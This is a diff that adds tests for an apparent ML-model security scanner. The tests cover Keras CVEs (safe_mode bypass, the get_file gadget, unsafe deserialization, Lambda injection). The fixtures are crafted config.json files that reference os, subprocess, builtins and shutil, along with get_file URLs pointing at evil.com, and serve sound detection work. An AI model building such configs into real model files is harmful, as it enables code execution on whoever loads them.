@@ -15,7 +15,7 @@ import zipfile
 from pathlib import Path
 from typing import Any
 
-from modelaudit.scanners.base import IssueSeverity
+from modelaudit.scanners.base import CheckStatus, IssueSeverity
 from modelaudit.scanners.keras_zip_scanner import KerasZipScanner
 
 
@@ -598,6 +598,696 @@ class TestCVE202549655TorchModuleWrapper:
         warning_checks = [c for c in result.checks if "Version Unknown" in c.name]
         assert len(warning_checks) >= 1
         assert warning_checks[0].severity == IssueSeverity.WARNING
+
+
+class TestCVE20251550ModuleReferences:
+    """Test CVE-2025-1550: Keras safe_mode bypass via arbitrary module references in config.json."""
+
+    def _make_keras_zip(self, config: dict[str, Any], tmp_path: Path) -> str:
+        """Helper to create a .keras ZIP with the given config.json."""
+        keras_path = tmp_path / "model.keras"
+        with zipfile.ZipFile(keras_path, "w") as zf:
+            zf.writestr("config.json", json.dumps(config))
+            zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
+        return str(keras_path)
+
+    def test_dangerous_module_os_in_layer(self, tmp_path: Path) -> None:
+        """A layer referencing 'os' module should be flagged as CRITICAL."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "module": "os",
+                        "config": {"units": 10},
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
+        assert len(cve_issues) >= 1, "Should detect dangerous 'os' module reference"
+        assert cve_issues[0].severity == IssueSeverity.CRITICAL
+
+    def test_dangerous_module_subprocess_in_fn_module(self, tmp_path: Path) -> None:
+        """A layer with fn_module='subprocess' should be flagged as CRITICAL."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Functional",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "config": {"units": 10, "fn_module": "subprocess"},
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
+        assert len(cve_issues) >= 1, "Should detect dangerous 'subprocess' fn_module reference"
+        assert cve_issues[0].severity == IssueSeverity.CRITICAL
+
+    def test_dangerous_module_builtins_dotpath(self, tmp_path: Path) -> None:
+        """A layer referencing 'builtins.eval' should be flagged as CRITICAL."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "evil_dense",
+                        "module": "builtins",
+                        "config": {"units": 1},
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
+        assert len(cve_issues) >= 1
+        assert cve_issues[0].severity == IssueSeverity.CRITICAL
+        assert "builtins" in cve_issues[0].message
+
+    def test_untrusted_module_custom_package(self, tmp_path: Path) -> None:
+        """Unknown module references in callable context should be flagged as WARNING."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Lambda",
+                        "name": "lambda_1",
+                        "config": {
+                            "fn_module": "my_custom_package.layers",
+                        },
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
+        assert len(cve_issues) >= 1, "Should flag non-allowlisted module"
+        assert cve_issues[0].severity == IssueSeverity.WARNING
+
+    def test_safe_keras_module_no_false_positive(self, tmp_path: Path) -> None:
+        """A layer referencing 'keras.layers' should NOT be flagged."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "module": "keras.layers",
+                        "config": {"units": 10},
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
+        assert len(cve_issues) == 0, "Safe keras.layers module should not be flagged"
+
+    def test_safe_tensorflow_module_no_false_positive(self, tmp_path: Path) -> None:
+        """A layer referencing 'tensorflow.keras.layers' should NOT be flagged."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "module": "tensorflow.keras.layers",
+                        "config": {"units": 10},
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
+        assert len(cve_issues) == 0, "Safe tensorflow module should not be flagged"
+
+    def test_nested_model_module_reference(self, tmp_path: Path) -> None:
+        """Dangerous module in nested model layer should be detected."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Model",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Model",
+                        "name": "submodel",
+                        "config": {
+                            "layers": [
+                                {
+                                    "class_name": "Dense",
+                                    "name": "nested_evil",
+                                    "module": "shutil",
+                                    "config": {"units": 1},
+                                }
+                            ]
+                        },
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
+        assert len(cve_issues) >= 1, "Should detect dangerous module in nested model"
+        assert cve_issues[0].severity == IssueSeverity.CRITICAL
+
+    def test_cve_attribution_details(self, tmp_path: Path) -> None:
+        """CVE-2025-1550 details should be present in issue details."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "module": "os",
+                        "config": {"units": 10},
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
+        assert len(cve_issues) >= 1
+        details = cve_issues[0].details
+        assert details["cve_id"] == "CVE-2025-1550"
+        assert details["cvss"] == 9.8
+        assert details["cwe"] == "CWE-502"
+        assert details["description"]
+
+    def test_none_module_value_not_flagged(self, tmp_path: Path) -> None:
+        """Layer with module=None should not trigger CVE-2025-1550."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "module": None,
+                        "config": {"units": 10},
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
+        assert len(cve_issues) == 0, "None module should not trigger CVE"
+
+    def test_non_callable_layer_unknown_module_not_flagged(self, tmp_path: Path) -> None:
+        """Unknown module on non-callable layers should not produce noisy CVE warnings."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "module": "my_custom_package.layers",
+                        "config": {"units": 10},
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
+        assert len(cve_issues) == 0, "Non-callable layer module should not trigger CVE-2025-1550 warning"
+
+    def test_prefix_collision_module_is_not_allowlisted(self, tmp_path: Path) -> None:
+        """Module like 'mathutils.payload' should NOT be treated as safe 'math'."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Lambda",
+                        "name": "lambda_1",
+                        "config": {
+                            "fn_module": "mathutils.payload",
+                        },
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
+        assert len(cve_issues) >= 1, "mathutils should not match safe 'math' prefix"
+        assert cve_issues[0].severity == IssueSeverity.WARNING
+
+
+class TestCVE20258747GetFileGadget:
+    """Test CVE-2025-8747: keras.utils.get_file gadget bypass detection."""
+
+    def _make_keras_zip(self, config_str: str, tmp_path: Path) -> str:
+        """Helper to create a .keras ZIP with raw config string."""
+        keras_path = tmp_path / "model.keras"
+        with zipfile.ZipFile(keras_path, "w") as zf:
+            zf.writestr("config.json", config_str)
+            zf.writestr("metadata.json", json.dumps({"keras_version": "3.5.0"}))
+        return str(keras_path)
+
+    def test_get_file_with_url_detected(self, tmp_path: Path) -> None:
+        """Config referencing get_file with URL should be CRITICAL."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "module": "keras.utils",
+                        "config": {
+                            "fn": "get_file",
+                            "url": "https://evil.com/payload.bin",
+                        },
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
+        assert len(cve_issues) >= 1, "Should detect get_file + URL as CVE-2025-8747"
+        assert cve_issues[0].severity == IssueSeverity.CRITICAL
+
+    def test_get_file_with_url_in_args_list_detected(self, tmp_path: Path) -> None:
+        """Config with URL inside args list should also be detected."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "config": {
+                            "fn": "get_file",
+                            "args": ["https://evil.com/payload.bin"],
+                        },
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
+        assert len(cve_issues) >= 1, "Should detect get_file + URL in args list as CVE-2025-8747"
+        assert cve_issues[0].severity == IssueSeverity.CRITICAL
+
+    def test_get_file_with_url_and_comment_token_detected(self, tmp_path: Path) -> None:
+        """Embedded comment tokens in URL strings should not suppress detection."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "config": {
+                            "fn": "get_file",
+                            "url": "https://evil.com/payload.bin#comment-token",
+                        },
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
+        assert len(cve_issues) >= 1
+        assert cve_issues[0].severity == IssueSeverity.CRITICAL
+        assert cve_issues[0].details["cve_id"] == "CVE-2025-8747"
+
+    def test_get_file_without_url_no_trigger(self, tmp_path: Path) -> None:
+        """Config with get_file but no URL should NOT trigger."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "config": {"fn": "get_file", "path": "/local/file.h5"},
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
+        assert len(cve_issues) == 0, "get_file without URL should not trigger"
+
+    def test_no_false_positive_normal_config(self, tmp_path: Path) -> None:
+        """Normal config should not trigger CVE-2025-8747."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": {"units": 10}}]},
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
+        assert len(cve_issues) == 0
+
+    def test_get_file_and_url_in_different_contexts_not_flagged(self, tmp_path: Path) -> None:
+        """Keyword co-occurrence across unrelated dicts should not trigger CVE."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Model",
+            "config": {
+                "layers": [{"class_name": "Dense", "name": "dense_1", "config": {"fn": "get_file"}}],
+                "metadata": {"download_url": "https://example.com/model-info"},
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
+        assert len(cve_issues) == 0, "get_file and URL in unrelated contexts should not trigger CVE-2025-8747"
+
+    def test_cve_attribution_details(self, tmp_path: Path) -> None:
+        """CVE details should be in issue details."""
+        scanner = KerasZipScanner()
+        config_str = json.dumps(
+            {
+                "class_name": "Sequential",
+                "config": {
+                    "layers": [
+                        {
+                            "class_name": "Dense",
+                            "name": "d",
+                            "config": {
+                                "fn": "get_file",
+                                "url": "http://evil.com/x",
+                            },
+                        }
+                    ]
+                },
+            }
+        )
+        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
+        assert len(cve_issues) >= 1
+        details = cve_issues[0].details
+        assert details["cve_id"] == "CVE-2025-8747"
+        assert details["cvss"] == 8.8
+        assert details["cwe"] == "CWE-502"
+        assert details["description"]
+        assert "3.11.0" in details["remediation"]
+
+
+class TestCVE20259906UnsafeDeserialization:
+    """Test CVE-2025-9906: enable_unsafe_deserialization config bypass detection."""
+
+    def _make_keras_zip(self, config_str: str, tmp_path: Path) -> str:
+        """Helper to create a .keras ZIP with raw config string."""
+        keras_path = tmp_path / "model.keras"
+        with zipfile.ZipFile(keras_path, "w") as zf:
+            zf.writestr("config.json", config_str)
+            zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
+        return str(keras_path)
+
+    def test_enable_unsafe_deserialization_detected(self, tmp_path: Path) -> None:
+        """Config referencing enable_unsafe_deserialization should be CRITICAL."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "module": "keras.config",
+                        "config": {
+                            "fn": "enable_unsafe_deserialization",
+                        },
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
+        assert len(cve_issues) >= 1, "Should detect enable_unsafe_deserialization reference"
+        assert cve_issues[0].severity == IssueSeverity.CRITICAL
+        cve_checks = [c for c in result.checks if c.name == "CVE-2025-9906: Unsafe Deserialization Bypass"]
+        assert len(cve_checks) >= 1
+        assert any(c.status != CheckStatus.PASSED for c in cve_checks)
+
+    def test_enable_unsafe_deserialization_in_nested_value(self, tmp_path: Path) -> None:
+        """enable_unsafe_deserialization anywhere in config should be detected."""
+        scanner = KerasZipScanner()
+        # Embed the string in a deeply nested config value
+        config_str = json.dumps(
+            {
+                "class_name": "Model",
+                "config": {
+                    "layers": [],
+                    "metadata": {"loader": "keras.config.enable_unsafe_deserialization"},
+                },
+            }
+        )
+        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
+        assert len(cve_issues) >= 1
+        cve_checks = [c for c in result.checks if c.name == "CVE-2025-9906: Unsafe Deserialization Bypass"]
+        assert len(cve_checks) >= 1
+        assert any(c.status != CheckStatus.PASSED for c in cve_checks)
+
+    def test_no_false_positive_normal_config(self, tmp_path: Path) -> None:
+        """Normal config without enable_unsafe_deserialization should be clean."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "config": {"units": 10},
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
+        assert len(cve_issues) == 0, "Normal config should not trigger CVE-2025-9906"
+
+    def test_cve_attribution_details(self, tmp_path: Path) -> None:
+        """CVE details should be present in issue details."""
+        scanner = KerasZipScanner()
+        config_str = json.dumps(
+            {
+                "class_name": "Sequential",
+                "config": {
+                    "layers": [
+                        {
+                            "class_name": "Dense",
+                            "name": "d",
+                            "module": "keras.config",
+                            "config": {"fn": "enable_unsafe_deserialization"},
+                        }
+                    ]
+                },
+            }
+        )
+        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
+        assert len(cve_issues) >= 1
+        details = cve_issues[0].details
+        assert details["cve_id"] == "CVE-2025-9906"
+        assert details["cwe"] == "CWE-502"
+        assert details["cvss"] == 8.6
+        assert details["description"]
+        assert details["config_path"] == "config.json"
+        assert details["matched_symbol"] == "enable_unsafe_deserialization"
+        assert details["detection_method"] in {"structured_config_scan", "raw_config_scan"}
+
+    def test_plain_text_mention_without_keras_context_not_flagged(self, tmp_path: Path) -> None:
+        """A plain text mention should not trigger when no keras.config context exists."""
+        scanner = KerasZipScanner()
+        config_str = json.dumps(
+            {
+                "class_name": "Model",
+                "config": {
+                    "layers": [],
+                    "notes": "This doc mentions enable_unsafe_deserialization for awareness only",
+                },
+            }
+        )
+        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
+        assert len(cve_issues) == 0
+
+    def test_cross_object_tokens_do_not_trigger_false_positive(self, tmp_path: Path) -> None:
+        """Separate context/token in different objects should not trigger CVE."""
+        scanner = KerasZipScanner()
+        config_str = json.dumps(
+            {
+                "class_name": "Model",
+                "config": {
+                    "layers": [
+                        {"class_name": "Dense", "name": "d1", "config": {"fn": "enable_unsafe_deserialization"}},
+                        {"class_name": "Dense", "name": "d2", "module": "keras.config", "config": {"units": 16}},
+                    ],
+                },
+            }
+        )
+        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
+        assert len(cve_issues) == 0, "Cross-object token co-occurrence should not trigger CVE-2025-9906"
+
+    def test_comment_token_does_not_suppress_malicious_detection(self, tmp_path: Path) -> None:
+        """Embedding a single comment token should not suppress CVE detection."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "d",
+                        "module": "keras.config",
+                        "config": {"fn": "enable_unsafe_deserialization", "notes": "#"},
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
+        assert len(cve_issues) >= 1
+
+
+class TestCVE20243660LambdaAttribution:
+    """Test CVE-2024-3660: Lambda layer code injection attribution."""
+
+    def _make_keras_zip(self, config: dict, tmp_path: Path, keras_version: str = "2.10.0") -> str:
+        keras_path = tmp_path / "model.keras"
+        with zipfile.ZipFile(keras_path, "w") as zf:
+            zf.writestr("config.json", json.dumps(config))
+            zf.writestr("metadata.json", json.dumps({"keras_version": keras_version}))
+        return str(keras_path)
+
+    def test_lambda_layer_has_cve_2024_3660_attribution(self, tmp_path: Path) -> None:
+        """Lambda layer in .keras file should include CVE-2024-3660 attribution."""
+        scanner = KerasZipScanner()
+        encoded = base64.b64encode(b"lambda x: x * 2").decode()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Lambda",
+                        "name": "my_lambda",
+                        "config": {"function": [encoded, None, None]},
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        cve_issues = [i for i in result.issues if "CVE-2024-3660" in i.message]
+        assert len(cve_issues) >= 1, "Lambda should have CVE-2024-3660 attribution"
+        assert cve_issues[0].severity == IssueSeverity.CRITICAL
+        assert cve_issues[0].details["cve_id"] == "CVE-2024-3660"
+        assert cve_issues[0].details["cvss"] == 9.8
+        assert cve_issues[0].details["cwe"] == "CWE-94"
+        assert cve_issues[0].details["description"]
+        assert cve_issues[0].details["remediation"]
+        assert cve_issues[0].details["layer_name"] == "my_lambda"
+
+    def test_no_cve_without_lambda(self, tmp_path: Path) -> None:
+        """Non-Lambda model should NOT have CVE-2024-3660 attribution."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": {"units": 10}}]},
+        }
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        cve_issues = [i for i in result.issues if "CVE-2024-3660" in i.message]
+        assert len(cve_issues) == 0
+
+    def test_no_cve_for_fixed_keras_version(self, tmp_path: Path) -> None:
+        """Lambda in fixed Keras version should not be CVE-attributed."""
+        scanner = KerasZipScanner()
+        encoded = base64.b64encode(b"lambda x: x * 2").decode()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Lambda",
+                        "name": "my_lambda",
+                        "config": {"function": [encoded, None, None]},
+                    }
+                ]
+            },
+        }
+        keras_path = tmp_path / "model_fixed.keras"
+        with zipfile.ZipFile(keras_path, "w") as zf:
+            zf.writestr("config.json", json.dumps(config))
+            zf.writestr("metadata.json", json.dumps({"keras_version": "2.13.0"}))
+
+        result = scanner.scan(str(keras_path))
+        cve_issues = [i for i in result.issues if "CVE-2024-3660" in i.message]
+        assert len(cve_issues) == 0
+
+    def test_cve_for_two_part_keras_version(self, tmp_path: Path) -> None:
+        """Lambda in Keras 2.10 (two-part version) should be CVE-attributed."""
+        scanner = KerasZipScanner()
+        encoded = base64.b64encode(b"lambda x: x * 2").decode()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Lambda",
+                        "name": "my_lambda",
+                        "config": {"function": [encoded, None, None]},
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(config, tmp_path, keras_version="2.10"))
+        cve_issues = [i for i in result.issues if "CVE-2024-3660" in i.message]
+        assert len(cve_issues) >= 1, "Keras 2.10 should be attributed as vulnerable"
+        assert cve_issues[0].severity == IssueSeverity.CRITICAL
 
 
 class TestKerasZipScannerSubclassed:
